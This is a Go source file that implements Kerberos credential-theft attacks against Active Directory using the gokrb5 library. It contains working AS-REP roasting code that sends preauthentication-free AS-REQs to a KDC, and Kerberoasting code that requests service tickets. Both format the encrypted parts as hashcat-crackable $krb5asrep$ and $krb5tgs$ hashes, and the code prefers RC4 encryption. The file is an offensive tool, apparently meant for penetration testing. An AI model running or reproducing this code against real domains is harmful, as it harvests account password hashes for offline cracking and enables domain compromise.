package krb

import (
	"fmt"
	"log"
	"net"
	"strings"
	"time"

	"github.com/jcmturner/gokrb5/v8/client"
	"github.com/jcmturner/gokrb5/v8/config"
	"github.com/jcmturner/gokrb5/v8/iana/etypeID"
	"github.com/jcmturner/gokrb5/v8/messages"
	"github.com/jcmturner/gokrb5/v8/types"
)

// RealKerberosClient implements real Kerberos protocol operations
type RealKerberosClient struct {
	domain         string
	kdcAddress     string
	config         *config.Config
	clientSAM      string
	clientPassword string
}

// SetClientCredentials configures the principal used to obtain a TGT for Kerberoasting.
func (k *RealKerberosClient) SetClientCredentials(sam, password string) {
	k.clientSAM = sam
	k.clientPassword = password
}

// NewRealKerberosClient creates a new real Kerberos client
func NewRealKerberosClient(domain, kdcAddress string) (*RealKerberosClient, error) {
	// Normalize domain to uppercase
	domain = strings.ToUpper(domain)

	// Create Kerberos configuration
	cfg, err := config.NewFromString(fmt.Sprintf(`[libdefaults]
    default_realm = %s
    dns_lookup_realm = false
    dns_lookup_kdc = false
    ticket_lifetime = 24h
    renew_lifetime = 7d
    forwardable = true
    default_tgs_enctypes = rc4-hmac aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96
    default_tkt_enctypes = rc4-hmac aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96

[realms]
    %s = {
        kdc = %s:88
        admin_server = %s:749
        default_domain = %s
    }

[domain_realm]
    .%s = %s
    %s = %s
`, domain, domain, kdcAddress, kdcAddress, strings.ToLower(domain),
		strings.ToLower(domain), domain, strings.ToLower(domain), domain))

	if err != nil {
		return nil, fmt.Errorf("failed to create Kerberos config: %v", err)
	}

	return &RealKerberosClient{
		domain:     domain,
		kdcAddress: kdcAddress,
		config:     cfg,
	}, nil
}

// ExtractASREPHash performs real AS-REP roasting using Kerberos protocol
func (k *RealKerberosClient) ExtractASREPHash(username string) (string, error) {
	log.Printf("[*] Performing real AS-REP roasting for %s@%s", username, k.domain)

	principalName := types.NewPrincipalName(1, username)

	asReq, err := messages.NewASReqForTGT(k.domain, k.config, principalName)
	if err != nil {
		return "", fmt.Errorf("failed to create AS-REQ: %v", err)
	}

	asReq.PAData = types.PADataSequence{}

	// Prefer modern etypes first, then RC4 (hashcat supports 18200 for common etypes)
	asReq.ReqBody.EType = []int32{
		int32(etypeID.AES256_CTS_HMAC_SHA1_96),
		int32(etypeID.AES128_CTS_HMAC_SHA1_96),
		int32(etypeID.RC4_HMAC),
	}

	b, err := asReq.Marshal()
	if err != nil {
		return "", fmt.Errorf("failed to marshal AS-REQ: %v", err)
	}

	rb, err := sendToKDCTCP(k.kdcAddress, b)
	if err != nil {
		return "", fmt.Errorf("failed to communicate with KDC: %v", err)
	}

	var asRep messages.ASRep
	err = asRep.Unmarshal(rb)
	if err != nil {
		var krbErr messages.KRBError
		if errUnmarshal := krbErr.Unmarshal(rb); errUnmarshal == nil {
			return "", fmt.Errorf("KDC returned error: %s (code: %d)", krbErr.EText, krbErr.ErrorCode)
		}
		return "", fmt.Errorf("failed to parse AS-REP: %v", err)
	}

	hash := formatASREPHashForHashcat(username, k.domain, &asRep)
	log.Printf("[+] Successfully extracted AS-REP hash for %s@%s", username, k.domain)
	return hash, nil
}

// ExtractKerberoastHash requests a TGS for spn using client credentials; username is the service account SAM for hash labeling.
func (k *RealKerberosClient) ExtractKerberoastHash(serviceAccountSAM, spn string) (string, error) {
	log.Printf("[*] Performing real Kerberoasting for %s@%s (SPN: %s)", serviceAccountSAM, k.domain, spn)

	if k.clientSAM == "" || k.clientPassword == "" {
		return "", fmt.Errorf("Kerberoasting requires client credentials (LDAP bind user/password)")
	}

	cl := client.NewWithPassword(k.clientSAM, k.domain, k.clientPassword, k.config, client.DisablePAFXFAST(true))
	tkt, _, err := cl.GetServiceTicket(spn)
	if err != nil {
		return "", fmt.Errorf("GetServiceTicket failed: %w", err)
	}

	hash := formatKerberoastHashForHashcat(serviceAccountSAM, k.domain, spn, tkt)
	log.Printf("[+] Successfully extracted Kerberoast hash for %s@%s", serviceAccountSAM, k.domain)
	return hash, nil
}

// formatASREPHashForHashcat formats AS-REP response for hashcat mode 18200
func formatASREPHashForHashcat(username, domain string, asRep *messages.ASRep) string {
	encType := asRep.EncPart.EType
	cipher := asRep.EncPart.Cipher
	cipherHex := fmt.Sprintf("%x", cipher)
	return fmt.Sprintf("$krb5asrep$%d$%s@%s:%s",
		encType,
		username,
		domain,
		cipherHex)
}

func kerberoastChecksumLen(encType int32) int {
	switch encType {
	case int32(etypeID.AES256_CTS_HMAC_SHA1_96), int32(etypeID.AES128_CTS_HMAC_SHA1_96):
		return 12
	default:
		return 16
	}
}

// formatKerberoastHashForHashcat formats service ticket for hashcat (mode 13100 etype 23, 19600/19700-style for AES).
func formatKerberoastHashForHashcat(username, domain, spn string, tkt messages.Ticket) string {
	encType := tkt.EncPart.EType
	cipher := tkt.EncPart.Cipher
	cipherHex := fmt.Sprintf("%x", cipher)

	checksumLen := kerberoastChecksumLen(encType)
	if len(cipher) < checksumLen {
		checksumLen = len(cipher) / 2
		if checksumLen < 1 {
			checksumLen = 1
		}
	}

	checksum := cipherHex[:checksumLen*2]
	encPart := cipherHex[checksumLen*2:]

	return fmt.Sprintf("$krb5tgs$%d$*%s$%s$%s*$%s$%s",
		encType,
		username,
		domain,
		spn,
		checksum,
		encPart)
}

// formatKerberoastHashFromTGSRep formats TGS-REP for hashcat
func formatKerberoastHashFromTGSRep(username, domain, spn string, tgsRep *messages.TGSRep) string {
	encType := tgsRep.Ticket.EncPart.EType
	cipher := tgsRep.Ticket.EncPart.Cipher
	cipherHex := fmt.Sprintf("%x", cipher)
	checksumLen := kerberoastChecksumLen(encType)
	if len(cipher) < checksumLen {
		checksumLen = len(cipher) / 2
		if checksumLen < 1 {
			checksumLen = 1
		}
	}
	checksum := cipherHex[:checksumLen*2]
	encPart := cipherHex[checksumLen*2:]
	return fmt.Sprintf("$krb5tgs$%d$*%s$%s$%s*$%s$%s",
		encType,
		username,
		domain,
		spn,
		checksum,
		encPart)
}

// parseSPNComponents parses SPN into components
func parseSPNComponents(spn string) []string {
	parts := strings.Split(spn, "/")
	if len(parts) < 2 {
		return []string{spn}
	}
	host := strings.Split(parts[1], ":")[0]
	return []string{parts[0], host}
}

// sendToKDCTCP sends a Kerberos message to the KDC via TCP
func sendToKDCTCP(kdcAddress string, message []byte) ([]byte, error) {
	if !strings.Contains(kdcAddress, ":") {
		kdcAddress = fmt.Sprintf("%s:88", kdcAddress)
	}

	conn, err := net.DialTimeout("tcp", kdcAddress, 10*time.Second)
	if err != nil {
		return nil, fmt.Errorf("failed to connect to KDC: %v", err)
	}
	defer conn.Close()

	conn.SetDeadline(time.Now().Add(30 * time.Second))

	length := uint32(len(message))
	lengthBytes := []byte{
		byte(length >> 24),
		byte(length >> 16),
		byte(length >> 8),
		byte(length),
	}

	if _, err := conn.Write(lengthBytes); err != nil {
		return nil, fmt.Errorf("failed to send message length: %v", err)
	}

	if _, err := conn.Write(message); err != nil {
		return nil, fmt.Errorf("failed to send message: %v", err)
	}

	respLengthBytes := make([]byte, 4)
	if _, err := conn.Read(respLengthBytes); err != nil {
		return nil, fmt.Errorf("failed to read response length: %v", err)
	}

	respLength := uint32(respLengthBytes[0])<<24 |
		uint32(respLengthBytes[1])<<16 |
		uint32(respLengthBytes[2])<<8 |
		uint32(respLengthBytes[3])

	response := make([]byte, respLength)
	totalRead := 0
	for totalRead < int(respLength) {
		n, err := conn.Read(response[totalRead:])
		if err != nil {
			return nil, fmt.Errorf("failed to read response: %v", err)
		}
		totalRead += n
	}

	return response, nil
}
